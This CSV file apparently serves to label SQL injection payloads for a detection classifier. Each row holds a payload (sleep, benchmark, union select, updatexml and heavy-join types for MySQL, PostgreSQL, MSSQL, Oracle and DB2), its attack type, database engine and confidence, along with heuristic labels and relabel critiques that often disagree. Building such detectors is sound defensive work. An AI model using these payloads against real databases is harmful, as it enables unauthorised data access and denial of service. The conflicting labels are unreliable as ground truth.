payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'eihl' = 'eihl,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,22058,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'eihl' = 'eihl
select ( case when ( 3140 = 4625 ) then 1 else 3140* ( select 3140 from master..sysdatabases ) end ) --,boolean_blind,mssql,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,mssql,22059,boolean_blind,mssql,generic SQL keywords without specific signal,boolean_blind,mssql,generic SQL structure without strong signal,select ( case when ( 3140 = 4625 ) then 1 else 3140* ( select 3140 from master..sysdatabases ) end ) --
"-9861' union all select 5710,5710,5710,5710,5710--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,22060,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9861' union all select 5710,5710,5710,5710,5710--"
"1 where 8273 = 8273 union all select null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,22061,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 where 8273 = 8273 union all select null,null,null,null,null,null,null,null#"
"1%' ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'time_blind' (P5),error_based,mysql,22062,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%' ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
"1"" ) ) as swix where 2459 = 2459 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,22063,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) as swix where 2459 = 2459 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --"
"1 ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 8382 = 8382",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,22064,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 ) ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 8382 = 8382"
1 ) as selm where 5759 = 5759,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,22065,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1 ) as selm where 5759 = 5759
"-6112"" ) union all select 8203,8203,8203,8203,8203,8203,8203--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,22066,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6112"" ) union all select 8203,8203,8203,8203,8203,8203,8203--"
-8369 ) where 7234 = 7234 order by 1--,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,22067,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,-8369 ) where 7234 = 7234 order by 1--
"1' or elt ( 6272 = 6272,sleep ( 5 ) )",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,22068,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' or elt ( 6272 = 6272,sleep ( 5 ) )"
"1"" ) ) ) union all select null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,22069,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1"" ) ) ) union all select null,null#"
"1 ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 2997 = 2997",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,22070,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 2997 = 2997"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""%"" = """,time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,22071,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""%"" = """
1'|| ( select 'zqwd' where 1647 = 1647 rlike sleep ( 5 ) ) ||',time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,22072,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'zqwd' where 1647 = 1647 rlike sleep ( 5 ) ) ||'
"1"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""fcpm"" = ""fcpm",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,22073,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1"" ) ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( ( ""fcpm"" = ""fcpm"
1 where 2239 = 2239 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,22074,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,1 where 2239 = 2239 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --
1'|| ( select 'xemx' from dual where 4683 = 4683 or sleep ( 5 ) #,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,22075,time_blind,oracle,Pattern match: 'sleep (' → time_blind (P5); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal,1'|| ( select 'xemx' from dual where 4683 = 4683 or sleep ( 5 ) #
select ( case when ( 4291 = 6937 ) then 4291 else 4291* ( select 4291 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,22076,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 4291 = 6937 ) then 4291 else 4291* ( select 4291 from mysql.db ) end ) #
"1"" ) where 8462 = 8462 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,22077,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) where 8462 = 8462 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) --"
"-1055' union all select 7758,7758,7758,7758,7758,7758--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,22078,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-1055' union all select 7758,7758,7758,7758,7758,7758--"
"-2630' ) ) as xavw where 6291 = 6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,22079,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2630' ) ) as xavw where 6291 = 6291 union all select 6291,6291,6291,6291,6291,6291,6291,6291,6291#"
"1' where 8451 = 8451 union all select null,null,null,null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,22080,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' where 8451 = 8451 union all select null,null,null,null,null,null,null,null,null#"
1' where 8635 = 8635 order by 1--,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,22081,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' where 8635 = 8635 order by 1--
-8447 where 2850 = 2850 or 7147 = 3262,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,22082,boolean_blind,generic,Pattern match: 'or 7147 = 3262' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-8447 where 2850 = 2850 or 7147 = 3262
"1 and elt ( 4249 = 4249,7259 )",boolean_blind,oracle,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,oracle,22083,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 and elt ( 4249 = 4249,7259 )"
"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,22084,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1%' ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"1"" where 6179 = 6179",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,22085,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" where 6179 = 6179"
1' ) where 6842 = 6842,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,22086,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) where 6842 = 6842
"1' ) ) as qzyp where 5081 = 5081 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,22087,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1' ) ) as qzyp where 5081 = 5081 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --"
-3937 ) ) or 3038 = 3038,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,22088,boolean_blind,generic,Pattern match: 'or 3038 = 3038' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-3937 ) ) or 3038 = 3038
"1%' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and '%' = '",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,22089,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal,"1%' or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and '%' = '"
1'+ ( select 'diet' where 7004 = 7004 rlike sleep ( 5 ) ) +',time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,22090,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1'+ ( select 'diet' where 7004 = 7004 rlike sleep ( 5 ) ) +'
1' ) as cdrm where 4595 = 4595 order by 1#,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,22091,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as cdrm where 4595 = 4595 order by 1#
"1"" ) ) as zbfj where 2285 = 2285",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,22092,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as zbfj where 2285 = 2285"
"1' ) where 4407 = 4407 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,22093,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1' ) where 4407 = 4407 and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --"
1 and 4595 = 4595#,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,22094,boolean_blind,generic,Pattern match: 'and 4595 = 4595' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 and 4595 = 4595#
-9429' ) order by 1--,boolean_blind,generic,0.5,order_by,RELABEL,reasoning too short (8 chars); confidence too low (0.50),boolean_blind,generic,22095,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check,-9429' ) order by 1--
1%' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( '%' = ',time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,22096,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1%' ) ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ( '%' = '
"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""alkz"" = ""alkz",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,22097,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1"" ) ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ( ""alkz"" = ""alkz"
select ( case when ( 5152 = 7853 ) then 5152 else 5152* ( select 5152 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,22098,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 5152 = 7853 ) then 5152 else 5152* ( select 5152 from mysql.db ) end ) #
"1%"" union all select null,null,null,null,null,null#",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,22099,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%"" union all select null,null,null,null,null,null#"
"1 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,22100,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --"
"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'peyy' = 'peyy",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,22101,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'peyy' = 'peyy"
"1 ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,22102,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 ) and elt ( 3114 = 3114,sleep ( 5 ) ) #"
"1 ) as zmjm where 9125 = 9125 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,22103,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload),"1 ) as zmjm where 9125 = 9125 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --"
"-7802' ) ) ) or elt ( 8778 = 9974,9974 ) and ( ( ( 'glsq' like 'glsq",boolean_blind,generic,0.5,elt_equality,RELABEL,reasoning too short (12 chars); confidence too low (0.50),boolean_blind,generic,22104,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-7802' ) ) ) or elt ( 8778 = 9974,9974 ) and ( ( ( 'glsq' like 'glsq"
1 or sleep ( 5 ) #,time_blind,mysql,0.9,sleep_time,RELABEL,reasoning too short (10 chars),time_blind,mysql,22105,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,1 or sleep ( 5 ) #
"1"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""zhxm"" = ""zhxm",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,22106,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1"" and elt ( 1210 = 1210,sleep ( 5 ) ) and ""zhxm"" = ""zhxm"
"1 ) ) as myyh where 5116 = 5116 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,22107,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected,"1 ) ) as myyh where 5116 = 5116 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --"
"1', ( select ( case when ( 4209 = 5879 ) then 1 else 4209* ( select 4209 from information_schema.character_sets ) end ) )",boolean_blind,mssql,0.7,case_cast,RELABEL,reasoning too short (9 chars),boolean_blind,mssql,22108,boolean_blind,mysql,generic SQL keywords without specific signal,boolean_blind,mysql,generic SQL structure without strong signal,"1', ( select ( case when ( 4209 = 5879 ) then 1 else 4209* ( select 4209 from information_schema.character_sets ) end ) )"
1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'gzpx' = 'gzpx,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,22109,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)",1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'gzpx' = 'gzpx
"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'bzgs' like 'bzgs",boolean_blind,mysql,0.7,if_subquery,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,22110,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'bzgs' like 'bzgs"
"-2314"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""uatq"" like ""uatq",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,22111,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-2314"" ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ""uatq"" like ""uatq"
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 'dvpw' = 'dvpw",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,22112,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( 'dvpw' = 'dvpw"
"1' ) ) as nxhp where 2649 = 2649 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",heavy_query,generic,0.7,domain_join,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,22113,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1' ) ) as nxhp where 2649 = 2649 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --"
"-2287' ) ) union all select 1200,1200,1200,1200,1200#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,22114,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2287' ) ) union all select 1200,1200,1200,1200,1200#"
"-6184"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""rovr"" = ""rovr",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,22115,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-6184"" ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ""rovr"" = ""rovr"
select ( case when ( 6002 = 9048 ) then 6002 else 6002* ( select 6002 from mysql.db ) end ) #,boolean_blind,mysql,0.7,mysql_db,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,22116,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,select ( case when ( 6002 = 9048 ) then 6002 else 6002* ( select 6002 from mysql.db ) end ) #
1'|| ( select 'ywfo' from dual where 4168 = 4168 rlike sleep ( 5 ) #,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars),time_blind,mysql,22117,time_blind,oracle,Pattern match: 'sleep (' → time_blind (P5); DB signature: oracle,boolean_blind,oracle,"boolean condition (1=1, RLIKE, or ELT)",1'|| ( select 'ywfo' from dual where 4168 = 4168 rlike sleep ( 5 ) #
